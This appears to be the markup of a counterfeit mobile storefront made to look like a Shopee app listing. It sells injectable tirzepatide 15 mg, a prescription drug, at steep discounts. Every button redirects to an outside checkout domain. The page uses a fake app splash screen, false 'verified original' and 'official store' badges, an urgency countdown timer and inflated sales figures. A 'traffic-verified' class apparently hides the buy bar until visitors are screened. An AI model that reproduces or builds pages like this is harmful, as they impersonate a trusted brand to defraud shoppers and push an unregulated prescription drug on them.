    padding: 0 !important;
    margin: 0 !important;
}

.Dtu9HW ._87kPP {
    display: flex !important;
    flex-direction: column !important;
    gap: 20px !important;
    width: 100% !important;
    max-width: 100% !important;
    min-width: 0 !important;
    padding: 0 !important;
    margin: 0 !important;
}

.Dtu9HW .WgSr6D {
    width: 100% !important;
    max-width: 100% !important;
    padding: 0 !important;
    margin: 0 0 4px 0 !important;
}

.Dtu9HW .JlKgZM {
    font-size: 13px !important;
    font-weight: 700 !important;
    color: #222 !important;
    margin-bottom: 12px !important;
    text-transform: uppercase !important;
    letter-spacing: 0.3px !important;
}

.Dtu9HW .tYFPu_ {
    display: grid !important;
    grid-template-columns: 1fr 1fr !important;
    gap: 8px 12px !important;
    list-style: none !important;
    padding: 0 !important;
    margin: 0 0 12px 0 !important;
}

.Dtu9HW .wdBnpK {
    list-style: none !important;
    margin: 0 !important;
    padding: 0 !important;
}

.Dtu9HW .yIJgtJ {
    color: #666 !important;
    font-size: 12px !important;
    text-decoration: none !important;
    display: inline-flex !important;
    align-items: center !important;
    gap: 6px !important;
    line-height: 1.4 !important;
}

.Dtu9HW .yIJgtJ:hover {
    color: #ee4d2d !important;
}

.Dtu9HW .Uh8ZGt {
    font-size: 12px !important;
    color: #555 !important;
}

.Dtu9HW .n9X8as {
    display: flex !important;
    flex-wrap: wrap !important;
    gap: 8px !important;
    list-style: none !important;
    padding: 0 !important;
    margin: 0 0 14px 0 !important;
}

.Dtu9HW .Ei2TcA {
    background: #fff !important;
    border: 1px solid #e2e2e2 !important;
    border-radius: 4px !important;
    padding: 4px 8px !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    height: 32px !important;
    box-shadow: 0 1px 2px rgba(0,0,0,0.03) !important;
}

.Dtu9HW .Ei2TcA img {
    max-height: 20px !important;
    max-width: 44px !important;
    object-fit: contain !important;
}

.Dtu9HW .DLMbEy {
    display: flex !important;
    align-items: center !important;
    gap: 12px !important;
    background: #fff !important;
    padding: 10px !important;
    border-radius: 6px !important;
    border: 1px solid #eee !important;
    max-width: 280px !important;
}

.Dtu9HW .DLMbEy img {
    height: auto !important;
    max-width: 70px !important;
}

.Dtu9HW .uJiWCw {
    display: flex !important;
    flex-direction: column !important;
    gap: 6px !important;
}

.Dtu9HW .uJiWCw img {
    max-height: 20px !important;
    max-width: 68px !important;
}

.Dtu9HW .URvGxz {
    width: 100% !important;
    border-top: 1px solid #e8e8e8 !important;
    padding-top: 16px !important;
    margin-top: 16px !important;
    text-align: center !important;
}

.Dtu9HW .Pc3d01 {
    font-size: 11px !important;
    color: #888 !important;
    margin-bottom: 8px !important;
    text-align: center !important;
}

.Dtu9HW .hLS7q8 {
    display: flex !important;
    flex-wrap: wrap !important;
    justify-content: center !important;
    gap: 4px 8px !important;
    font-size: 11px !important;
    color: #888 !important;
    line-height: 1.5 !important;
}

.Dtu9HW .FvfvFP a {
    color: #666 !important;
    text-decoration: none !important;
    font-size: 11px !important;
}

.Dtu9HW .YBNMTj {
    width: 100% !important;
    margin-top: 12px !important;
    text-align: center !important;
}

.Dtu9HW .XFTguI {
    font-size: 10px !important;
    color: #999 !important;
    line-height: 1.5 !important;
    text-align: center !important;
}

/* 13. FLOATING SCROLL TO TOP BUTTON */
.shopee-scroll-top-btn {
    position: fixed !important;
    bottom: 66px !important;
    right: 14px !important;
    width: 40px !important;
    height: 40px !important;
    border-radius: 50% !important;
    background: #fff !important;
    border: 1px solid #ee4d2d !important;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15) !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    cursor: pointer !important;
    z-index: 9999 !important;
    opacity: 0 !important;
    pointer-events: none !important;
    transform: scale(0.8) !important;
    transition: opacity 0.25s, transform 0.25s !important;
}

.shopee-scroll-top-btn.visible {
    opacity: 1 !important;
    pointer-events: auto !important;
    transform: scale(1) !important;
}

/* 14. FIXED BOTTOM STICKY ACTION BAR */
.shopee-fixed-bottom-bar {
    position: fixed !important;
    bottom: 0 !important;
    left: 0 !important;
    right: 0 !important;
    height: 52px !important;
    background: #fff !important;
    z-index: 999999 !important;
    display: flex !important;
    align-items: stretch !important;
    box-shadow: 0 -1px 8px rgba(0, 0, 0, 0.08) !important;
    max-width: 560px !important;
    margin: 0 auto !important;
    opacity: 0 !important;
    pointer-events: none !important;
    transition: opacity 0.45s ease-out !important;
}

.shopee-fixed-bottom-bar.traffic-verified {
    opacity: 1 !important;
    pointer-events: auto !important;
}

.shopee-btn-teal {
    flex: 1.1 !important;
    background: #00bfa5 !important;
    color: #fff !important;
    display: flex !important;
    flex-direction: column !important;
    align-items: center !important;
    justify-content: center !important;
    font-size: 10px !important;
    font-weight: 500 !important;
    text-decoration: none !important;
    border-right: 1px solid rgba(255, 255, 255, 0.2) !important;
    gap: 2px !important;
    cursor: pointer !important;
}

.shopee-btn-teal:hover {
    background: #00a892 !important;
}

.shopee-btn-orange {
    flex: 1.8 !important;
    background: #ee4d2d !important;
    color: #fff !important;
    display: flex !important;
    flex-direction: column !important;
    align-items: center !important;
    justify-content: center !important;
    border: none !important;
    cursor: pointer !important;
    gap: 1px !important;
}

.shopee-btn-orange:hover {
    background: #e2492b !important;
}

.btn-top-txt {
    font-size: 12px !important;
    font-weight: 600 !important;
}

.btn-price-txt {
    font-size: 13px !important;
    font-weight: 700 !important;
}

/* 15. SHOPEE APP LAUNCH SPLASH (SUTILE APP-ENTRY TRANSITION) */
.shopee-app-splash {
    position: fixed !important;
    top: 0 !important;
    left: 0 !important;
    right: 0 !important;
    bottom: 0 !important;
    width: 100vw !important;
    height: 100vh !important;
    background-color: #ee4d2d !important;
    z-index: 9999999 !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    margin: 0 !important;
    padding: 0 !important;
    overflow: hidden !important;
    opacity: 1 !important;
    transform: scale(1) !important;
    transition: opacity 0.55s cubic-bezier(0.4, 0, 0.2, 1), transform 0.55s cubic-bezier(0.4, 0, 0.2, 1) !important;
    will-change: opacity, transform !important;
}

.shopee-app-splash.splash-hiding {
    opacity: 0 !important;
    transform: scale(1.025) !important;
    pointer-events: none !important;
}

.shopee-splash-inner {
    width: 100% !important;
    height: 100% !important;
    max-width: 480px !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    position: relative !important;
}

.shopee-splash-img {
    width: 100% !important;
    height: 100% !important;
    object-fit: contain !important;
    display: block !important;
}

.shopee-splash-loader {
    position: absolute !important;
    bottom: 45px !important;
    left: 50% !important;
    transform: translateX(-50%) !important;
    display: flex !important;
    flex-direction: column !important;
    align-items: center !important;
    gap: 8px !important;
    z-index: 10 !important;
}

.shopee-splash-spinner {
    width: 28px !important;
    height: 28px !important;
    border: 3px solid rgba(255, 255, 255, 0.3) !important;
    border-top-color: #ffffff !important;
    border-radius: 50% !important;
    animation: shopeeSplashSpin 0.75s linear infinite !important;
}

@keyframes shopeeSplashSpin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

/* 16. SHOPEE CUSTOMER STORY VIDEO MODAL */
.shopee-story-modal {
    position: fixed !important;
    top: 0 !important;
    left: 0 !important;
    right: 0 !important;
    bottom: 0 !important;
    width: 100vw !important;
    height: 100vh !important;
    background: rgba(0, 0, 0, 0.95) !important;
    z-index: 10000000 !important;
    display: none;
    align-items: center !important;
    justify-content: center !important;
    opacity: 0;
    transition: opacity 0.25s ease !important;
}

.shopee-story-modal.active {
    display: flex !important;
    opacity: 1 !important;
}

.shopee-story-container {
    position: relative !important;
    width: 100% !important;
    max-width: 440px !important;
    height: 100% !important;
    max-height: 100vh !important;
    display: flex !important;
    flex-direction: column !important;
    background: #000 !important;
    overflow: hidden !important;
}

.shopee-story-top-bars {
    position: absolute !important;
    top: 10px !important;
    left: 12px !important;
    right: 12px !important;
    display: flex !important;
    gap: 4px !important;
    z-index: 30 !important;
}

.shopee-story-progress-bar {
    flex: 1 !important;
    height: 3px !important;
    background: rgba(255, 255, 255, 0.35) !important;
    border-radius: 2px !important;
    overflow: hidden !important;
}

.shopee-story-progress-fill {
    width: 0%;
    height: 100% !important;
    background: #fff !important;
    border-radius: 2px !important;
    transition: width 0.08s linear !important;
}

.shopee-story-header {
    position: absolute !important;
    top: 22px !important;
    left: 12px !important;
    right: 12px !important;
    display: flex !important;
    align-items: center !important;
    justify-content: space-between !important;
    z-index: 30 !important;
    color: #fff !important;
}

.shopee-story-user {
    display: flex !important;
    align-items: center !important;
    gap: 8px !important;
}

.shopee-story-avatar {
    width: 34px !important;
    height: 34px !important;
    border-radius: 50% !important;
    border: 2px solid #ee4d2d !important;
    object-fit: cover !important;
}

.shopee-story-info-title {
    font-size: 13px !important;
    font-weight: 700 !important;
    color: #fff !important;
    text-shadow: 0 1px 3px rgba(0,0,0,0.85) !important;
}

.shopee-story-info-sub {
    font-size: 11px !important;
    color: rgba(255, 255, 255, 0.85) !important;
    text-shadow: 0 1px 2px rgba(0,0,0,0.85) !important;
}

.shopee-story-close-btn {
    background: rgba(0, 0, 0, 0.5) !important;
    border: 1px solid rgba(255, 255, 255, 0.25) !important;
    color: #fff !important;
    width: 34px !important;
    height: 34px !important;
    border-radius: 50% !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    cursor: pointer !important;
}

.shopee-story-video-wrap {
    width: 100% !important;
    height: 100% !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    position: relative !important;
    background: #000 !important;
}

.shopee-story-video {
    width: 100% !important;
    height: 100% !important;
    max-height: 100vh !important;
    object-fit: contain !important;
    background: #000 !important;
}

.shopee-story-nav-btn {
    position: absolute !important;
    top: 50% !important;
    transform: translateY(-50%) !important;
    width: 44px !important;
    height: 44px !important;
    background: rgba(0, 0, 0, 0.45) !important;
    border-radius: 50% !important;
    border: 1px solid rgba(255, 255, 255, 0.2) !important;
    color: #fff !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    cursor: pointer !important;
    z-index: 25 !important;
}

.shopee-story-nav-btn.prev {
    left: 10px !important;
}

.shopee-story-nav-btn.next {
    right: 10px !important;
}

.shopee-story-bottom-cta {
    position: absolute !important;
    bottom: 18px !important;
    left: 16px !important;
    right: 16px !important;
    z-index: 30 !important;
}

.shopee-story-cta-btn {
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    gap: 8px !important;
    width: 100% !important;
    height: 46px !important;
    background: #ee4d2d !important;
    color: #fff !important;
    font-size: 14px !important;
    font-weight: 700 !important;
    border-radius: 6px !important;
    text-decoration: none !important;
    box-shadow: 0 4px 14px rgba(238, 77, 45, 0.55) !important;
}

.shopee-story-item {
    cursor: pointer !important;
}

.shopee-story-item:active {
    transform: scale(0.95) !important;
}
    </style>
</head>
<body>

<!-- Shopee App Open Splash Screen (2.5s loading) -->
<div id="shopeeAppSplash" class="shopee-app-splash" aria-hidden="true">
    <div class="shopee-splash-inner">
        <img src="images/splash_app.jpg" alt="Shopee App Loading" class="shopee-splash-img">
        <div class="shopee-splash-loader">
            <div class="shopee-splash-spinner"></div>
        </div>
    </div>
</div>

<div id="main">
    <!-- Floating App Navigation Header (Over Media at top) -->
    <header class="shopee-floating-header" id="shopeeFloatingHeader">
        <a href="https://seguro.centralpag.online/api/public/shopify?product=156886789755&store=1568" class="shopee-circle-btn shopee-back-btn" aria-label="Voltar">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
        </a>
        <div class="shopee-header-right">
            <a href="https://seguro.centralpag.online/api/public/shopify?product=156886789755&store=1568" class="shopee-circle-btn shopee-cart-btn" aria-label="Carrinho">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="21" r="1"></circle><circle cx="20" cy="21" r="1"></circle><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"></path></svg>
                <span class="shopee-cart-badge">0</span>
            </a>
            <a href="https://seguro.centralpag.online/api/public/shopify?product=156886789755&store=1568" class="shopee-circle-btn shopee-more-btn" aria-label="Mais opções">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#fff"><circle cx="5" cy="12" r="2"></circle><circle cx="12" cy="12" r="2"></circle><circle cx="19" cy="12" r="2"></circle></svg>
            </a>
        </div>
    </header>

    <!-- Sticky Navigation Bar on Scroll (White background with truncated title) -->
    <header class="shopee-sticky-scrolled-header" id="shopeeStickyScrolledHeader">
        <a href="https://seguro.centralpag.online/api/public/shopify?product=156886789755&store=1568" class="scrolled-back-btn" aria-label="Voltar">
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#ee4d2d" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
        </a>
        <div class="scrolled-title">T.G. 15 · Tirzepatida 15 mg/0,5 mL</div>
        <div class="scrolled-right">
            <a href="https://seguro.centralpag.online/api/public/shopify?product=156886789755&store=1568" class="scrolled-cart-btn" aria-label="Carrinho">
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#ee4d2d" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="21" r="1"></circle><circle cx="20" cy="21" r="1"></circle><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"></path></svg>
                <span class="shopee-cart-badge">0</span>
            </a>
            <a href="https://seguro.centralpag.online/api/public/shopify?product=156886789755&store=1568" class="scrolled-more-btn" aria-label="Mais opções">
                <svg viewBox="0 0 24 24" width="22" height="22" fill="#888"><circle cx="5" cy="12" r="2"></circle><circle cx="12" cy="12" r="2"></circle><circle cx="19" cy="12" r="2"></circle></svg>
            </a>
        </div>
    </header>

    <!-- Media Carousel Section (5 fotos do produto Tirzepatida T.G. 15) -->
    <section class="shopee-media-section">
        <div class="shopee-carousel-wrapper" id="shopeeCarouselWrapper">
            <div class="shopee-carousel-track" id="shopeeCarouselTrack">
                <!-- Slide 0: Frasco Principal -->
                <div class="shopee-carousel-slide">
                    <img src="images/tg15-frasco.webp" alt="T.G. 15 Tirzepatida 15 mg/0,5 mL Frasco Original">
                </div>
                <!-- Slide 1: Caixa Kit Completo -->
                <div class="shopee-carousel-slide">
                    <img src="images/tg15-caixa.webp" alt="T.G. 15 Tirzepatida Caixa com 4 Frascos">
                </div>
                <!-- Slide 2: Lote e Validade -->
                <div class="shopee-carousel-slide">
                    <img src="images/tg15-frasco-lote.webp" alt="T.G. 15 Lote e Validade Rastreável">
                </div>
                <!-- Slide 3: Selo de Segurança -->
                <div class="shopee-carousel-slide">
                    <img src="images/tg15-frasco-selo.webp" alt="T.G. 15 Selo e Lacre de Segurança Original">
                </div>
                <!-- Slide 4: Detalhe Frasco Crop -->
                <div class="shopee-carousel-slide">
                    <img src="images/tg15-frasco-crop.webp" alt="T.G. 15 Detalhe Solução Injetável">
                </div>
            </div>
            <!-- Navigation Arrows -->
            <button type="button" class="shopee-carousel-nav-btn nav-prev" id="carouselPrevBtn" aria-label="Foto anterior">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
            </button>
            <button type="button" class="shopee-carousel-nav-btn nav-next" id="carouselNextBtn" aria-label="Próxima foto">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
            </button>
            <!-- Slide Counter Badge -->
            <div class="shopee-badge-counter" id="slideBadge">1/5</div>
        </div>

        <!-- Thumbnails ribbon directly under the carousel -->
        <div class="shopee-carousel-thumbnails-ribbon" id="carouselThumbsRibbon">
            <div class="carousel-thumb-item active" data-index="0">
                <img src="images/tg15-frasco.webp" alt="Foto 1 Frasco">
            </div>
            <div class="carousel-thumb-item" data-index="1">
                <img src="images/tg15-caixa.webp" alt="Foto 2 Caixa">
            </div>
            <div class="carousel-thumb-item" data-index="2">
                <img src="images/tg15-frasco-lote.webp" alt="Foto 3 Lote">
            </div>
            <div class="carousel-thumb-item" data-index="3">
                <img src="images/tg15-frasco-selo.webp" alt="Foto 4 Selo">
            </div>
            <div class="carousel-thumb-item" data-index="4">
                <img src="images/tg15-frasco-crop.webp" alt="Foto 5 Detalhes">
            </div>
        </div>
    </section>

    <!-- Customer Stories / Video Highlights (6 Depoimentos Rápidos em Círculos) -->
    <section class="shopee-stories-section">
        <div class="shopee-stories-header">
            <span class="shopee-stories-title">Vídeos de clientes <span class="shopee-stories-count">(6)</span></span>
            <a href="#shopeeStories" class="shopee-see-all" id="storySeeAllBtn">Ver todos &gt;</a>
        </div>
        <div class="shopee-stories-list">
            <div class="shopee-story-item" data-story-index="0">
                <div class="shopee-story-ring">
                    <div class="shopee-story-img-wrap">
                        <img src="images/tg-story-1.webp" alt="Recebimento">
                    </div>
                </div>
                <span class="shopee-story-label">Recebimento</span>
            </div>
            <div class="shopee-story-item" data-story-index="1">
                <div class="shopee-story-ring">
                    <div class="shopee-story-img-wrap">
                        <img src="images/tg-story-2.webp" alt="Unboxing">
                    </div>
                </div>
                <span class="shopee-story-label">Unboxing</span>
            </div>
            <div class="shopee-story-item" data-story-index="2">
                <div class="shopee-story-ring">
                    <div class="shopee-story-img-wrap">
                        <img src="images/tg-story-3.webp" alt="Frasco">
                    </div>
                </div>
                <span class="shopee-story-label">Frasco</span>
            </div>
            <div class="shopee-story-item" data-story-index="3">
                <div class="shopee-story-ring">
                    <div class="shopee-story-img-wrap">
                        <img src="images/tg-story-4.webp" alt="Embalagem">
                    </div>
                </div>
                <span class="shopee-story-label">Embalagem</span>
            </div>
            <div class="shopee-story-item" data-story-index="4">
                <div class="shopee-story-ring">
                    <div class="shopee-story-img-wrap">
                        <img src="images/tg-story-5.webp" alt="Detalhes">
                    </div>
                </div>
                <span class="shopee-story-label">Detalhes</span>
            </div>
            <div class="shopee-story-item" data-story-index="5">
                <div class="shopee-story-ring">
                    <div class="shopee-story-img-wrap">
                        <img src="images/tg-story-6.webp" alt="Abertura">
                    </div>
                </div>
                <span class="shopee-story-label">Abertura</span>
            </div>
        </div>
    </section>

    <!-- Authenticity & QR Code Banner Card -->
    <section class="shopee-authenticity-card">
        <div class="shopee-auth-content">
            <div class="shopee-auth-icon">
                <svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
            </div>
            <div class="shopee-auth-details">
                <div class="shopee-auth-title">
                    <span>Produto 100% Original</span>
                    <span class="shopee-auth-badge">VERIFICADO</span>
                </div>
                <div class="shopee-auth-desc">
                    Cada embalagem tem um QR Code único. Escaneie e confirme a autenticidade direto no sistema do laboratório.
                </div>
                <div class="shopee-auth-meta">
                    <span>LOTE:</span>
                    <span class="shopee-auth-tag">TG-2026-15MG</span>
                    <span style="color:#26aa99;font-size:11px;">• Lacre de fábrica</span>
                </div>
            </div>
        </div>
    </section>

    <!-- Oferta Relâmpago Flash Sale Banner -->
    <div class="shopee-flash-sale-bar">
        <div class="flash-left">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="#ffeb3b" stroke="#ffeb3b"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg>
            <span>Oferta Relâmpago</span>
        </div>
        <div class="flash-right">
            <span>TERMINA EM</span>
            <div class="flash-timer">
                <span class="timer-box" id="timerMin">19</span> :
                <span class="timer-box" id="timerSec">42</span>
            </div>
        </div>
    </div>

    <!-- Product Price & Main Info Section -->
    <section class="shopee-card shopee-price-card">
        <div class="shopee-price-row">
            <div class="shopee-price-main">
                <span class="shopee-currency">R$</span>
                <span class="shopee-amount" id="mainDisplayPrice">87,90</span>
                <span class="shopee-old-amount" id="mainOldPrice">R$ 250,00</span>
                <span class="shopee-pix-badge">-65% OFF</span>
            </div>
            <div class="shopee-sold-wishlist">
                <span class="shopee-sold-text">4.892 Vendidos</span>
                <button type="button" class="shopee-wishlist-btn" aria-label="Adicionar aos favoritos">
                    <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#757575" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
                </button>
            </div>
        </div>
        <div class="shopee-price-subtext">
            Em até 1x no Pix ou Cartão com aprovação imediata
        </div>
        <h1 class="shopee-product-title">
            <span style="background-color:#ee4d2d;color:white;border-radius:4px;padding:2px 6px;font-size:12px;font-weight:700;margin-right:6px;vertical-align:middle;">Indicado</span>T.G. 15 · Tirzepatida 15 mg/0,5 mL — <span id="titleVariationTxt">1 frasco</span>
        </h1>
    </section>

    <!-- Coupons Row -->
    <div class="shopee-coupons-row">
        <span style="font-size:11px;font-weight:700;color:#222;white-space:nowrap;">Cupons da loja:</span>
        <div class="shopee-coupon-pill" onclick="window.location.href=getFinalCheckoutUrl(CURRENT_CHECKOUT_URL)">
            <span>R$ 5 OFF (Cupom TG5)</span>
        </div>
        <div class="shopee-coupon-pill" onclick="window.location.href=getFinalCheckoutUrl(CURRENT_CHECKOUT_URL)">
            <span>R$ 7 OFF (Cupom TG7)</span>
        </div>
        <div class="shopee-coupon-pill" onclick="window.location.href=getFinalCheckoutUrl(CURRENT_CHECKOUT_URL)">
            <span>R$ 15 OFF (Cupom TG15)</span>
        </div>
    </div>

    <!-- Shipping Section (FRETE GRÁTIS REFRIGERADO) -->
    <section class="shopee-card shopee-shipping-card" onclick="window.location.href=getFinalCheckoutUrl(CURRENT_CHECKOUT_URL)" style="cursor:pointer;">
        <div class="shopee-shipping-row">
            <svg class="shopee-truck-icon" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#26aa99" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="3" width="15" height="13"></rect><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon><circle cx="5.5" cy="18.5" r="2.5"></circle><circle cx="18.5" cy="18.5" r="2.5"></circle></svg>
            <div class="shopee-shipping-info">
                <span style="color:#26aa99;font-weight:700;">Frete Grátis Expresso</span>
                <span class="old-shipping">R$ 64,90</span>
                <span class="new-shipping">R$ 0,00 (Caixa térmica refrigerada)</span>
            </div>
            <span class="shopee-chevron">&gt;</span>
        </div>
    </section>

    <!-- COMPLETE VARIATIONS SELECTION BLOCK (APRESENTAÇÃO / KITS) -->
    <section class="shopee-card shopee-variation-selection-card">
        <div class="variation-title-row">
            <span class="variation-main-title">Quanto T.G. 15 faz sentido para você?</span>
            <span class="variation-selected-name" id="selectedVarName">1 frasco</span>
        </div>
        <div class="shopee-package-grid">
            <!-- Kit 1: 1 unidade -->
            <div class="package-card selected" data-pkg="1" data-price="87,90" data-old="250,00" data-slide="0" data-title="1 frasco (1 unidade)" data-checkout-url="https://seguro.centralpag.online/api/public/shopify?product=156886789755&store=1568">
                <img src="images/tg15-frasco.webp" alt="1 Frasco" class="package-img">
                <span class="package-title">1 frasco</span>
                <span class="package-old-price">R$ 250,00</span>
                <span class="package-price">R$ 87,90</span>
                <div class="package-tick">
                    <svg viewBox="0 0 10 10" width="8" height="8" fill="#fff"><polygon points="3.8 8.5 0.5 5.2 1.9 3.8 3.8 5.7 8.1 1.4 9.5 2.8"></polygon></svg>
                </div>
            </div>
            <!-- Kit 2: 2 unidades -->
            <div class="package-card" data-pkg="2" data-price="137,90" data-old="500,00" data-slide="0" data-title="2 frascos (2 unidades)" data-checkout-url="https://seguro.centralpag.online/api/public/shopify?product=156891449648&store=1568">
                <img src="images/tg15-frasco.webp" alt="2 Frascos" class="package-img">
                <span class="package-title">2 frascos</span>
                <span class="package-old-price">R$ 500,00</span>
                <span class="package-price">R$ 137,90</span>
                <div class="package-tick">
                    <svg viewBox="0 0 10 10" width="8" height="8" fill="#fff"><polygon points="3.8 8.5 0.5 5.2 1.9 3.8 3.8 5.7 8.1 1.4 9.5 2.8"></polygon></svg>
                </div>
            </div>
            <!-- Kit 3: Caixa com 4 frascos (4 unidades - Mais Vendido) -->
            <div class="package-card" data-pkg="4" data-price="187,90" data-old="1.100,00" data-slide="1" data-title="Caixa com 4 frascos (Kit completo)" data-checkout-url="https://seguro.centralpag.online/api/public/shopify?product=156837437479&store=1568">
                <span class="package-badge">Kit completo</span>
                <img src="images/tg15-caixa.webp" alt="Kit 4 Frascos" class="package-img">
                <span class="package-title">Caixa 4 frascos</span>
                <span class="package-old-price">R$ 1.100,00</span>
                <span class="package-price">R$ 187,90</span>
                <div class="package-tick">
                    <svg viewBox="0 0 10 10" width="8" height="8" fill="#fff"><polygon points="3.8 8.5 0.5 5.2 1.9 3.8 3.8 5.7 8.1 1.4 9.5 2.8"></polygon></svg>
                </div>
            </div>
        </div>

        <!-- Quantity selector -->
        <div class="shopee-qty-row">
            <span class="qty-label">Quantidade</span>
            <div class="qty-controls">
                <button type="button" class="qty-btn" id="qtyMinus" aria-label="Diminuir" disabled style="opacity: 0.35; cursor: not-allowed;">-</button>
                <input type="number" class="qty-input" id="qtyInput" value="1" min="1" max="1" readonly aria-label="Quantidade" style="cursor: default;">
                <button type="button" class="qty-btn" id="qtyPlus" aria-label="Aumentar" disabled style="opacity: 0.35; cursor: not-allowed;">+</button>
            </div>
            <span class="qty-stock">Estoque com envio imediato</span>
        </div>
    </section>

    <!-- Cold Chain & Delivery Guarantees ("Seu pedido de T.G. 15") -->
    <section class="shopee-card shopee-guarantees-card">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
            <span style="font-size:13px;font-weight:700;color:#222;">Seu pedido de T.G. 15</span>
            <span style="font-size:11px;font-weight:500;color:#26aa99;">Proteção Total</span>
        </div>
        <div class="shopee-guarantees-grid">
            <div class="shopee-guarantee-col">
                <div class="guarantee-circle">
                    <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12h20M12 2v20M4.93 4.93l14.14 14.14M4.93 19.07l14.14-14.14"></path></svg>
                </div>
                <span class="guarantee-label">Envio<br>refrigerado</span>
            </div>
            <div class="shopee-guarantee-col">
                <div class="guarantee-circle">
                    <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"></path><path d="M3 3v5h5"></path></svg>
                </div>
                <span class="guarantee-label">Estorno<br>imediato</span>
            </div>
            <div class="shopee-guarantee-col">
                <div class="guarantee-circle">
                    <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                </div>
                <span class="guarantee-label">Pagamento<br>via PIX</span>
            </div>
            <div class="shopee-guarantee-col">
                <div class="guarantee-circle">
                    <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                </div>
                <span class="guarantee-label">Compra<br>sem risco</span>
            </div>
        </div>
        <div class="shopee-alert-box">
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#ee4d2d" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;margin-top:2px;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
            <div>
                <div class="shopee-alert-title">Não chegou refrigerado? Estorno imediato.</div>
                <div class="shopee-alert-text">Se o seu pedido chegar fora da temperatura recomendada (2 °C a 8 °C), devolvemos 100% do seu dinheiro na hora. Sem burocracia, sem complicação.</div>
            </div>
        </div>
    </section>

    <!-- Store Section (TG Brasil) -->
    <section class="shopee-card shopee-store-card">
        <div class="shopee-store-top">
            <div class="review-avatar-placeholder" style="width:44px;height:44px;background:#ee4d2d;color:#fff;font-weight:900;font-size:16px;">
                TG
            </div>
            <div class="shopee-store-info">
                <div class="shopee-store-name">
                    <span>TG Brasil</span>
                    <span style="background:#26aa99;color:#fff;font-size:9.5px;padding:1px 5px;border-radius:3px;font-weight:700;">OFICIAL</span>
                </div>
                <div class="shopee-store-status">Loja Verificada • Especializada em Peptídeos • Ativo agora</div>
            </div>
            <a href="javascript:void(0)" onclick="window.location.href=getFinalCheckoutUrl(CURRENT_CHECKOUT_URL)" class="shopee-store-visit-btn">Ver Loja</a>
        </div>
        <div class="shopee-store-metrics">
            <div class="shopee-store-metric">
                <span class="metric-val">12</span>
                <span class="metric-label">Produtos</span>
            </div>
            <div class="shopee-store-metric">
                <span class="metric-val">4.9</span>
                <span class="metric-label">Avaliação</span>
            </div>
            <div class="shopee-store-metric">
                <span class="metric-val">99%</span>
                <span class="metric-label">Resposta no Chat</span>
            </div>
            <div class="shopee-store-metric">
                <span class="metric-val">RA1000</span>
                <span class="metric-label">ReclameAqui</span>
            </div>
        </div>
    </section>

